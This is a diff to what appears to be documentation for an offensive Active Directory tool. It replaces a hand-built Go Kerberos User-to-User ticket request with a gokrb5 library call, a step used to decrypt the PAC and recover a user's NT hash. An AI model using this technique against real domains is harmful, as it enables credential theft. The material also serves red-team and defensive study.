@@ -52,17 +52,18 @@ The NT hash is encrypted in `PAC_CREDENTIAL_INFO` using a key derived from the P
 U2U requests a service ticket encrypted with our own TGT session key:
 
 ```go
-// Build TGS-REQ manually with enc-tkt-in-skey flag
-tgsReq := &krb.TGSRequest{
-    Realm:      realm,
-    CName:      clientPrincipal,
-    TGT:        tgt,             // Our TGT
-    SessionKey: sessionKey,      // TGT session key
-    SName:      clientPrincipal, // Request ticket to ourselves
-    SRealm:     realm,
-}
-// The additional-ticket (our TGT) is included so the KDC encrypts
-// the service ticket with our session key instead of the krbtgt key
+// Use gokrb5's built-in U2U TGS-REQ builder
+tgsReq, err := messages.NewUser2UserTGSReq(
+    clientPrincipal,
+    realm,
+    config,
+    tgt,           // Our TGT
+    sessionKey,    // TGT session key
+    clientPrincipal, // Request ticket to ourselves (sname)
+    false,         // Not renewal
+    tgt,           // Additional ticket — KDC encrypts service ticket
+                   // with our session key instead of the krbtgt key
+)
 ```
 
 ### 2. PAC Structure
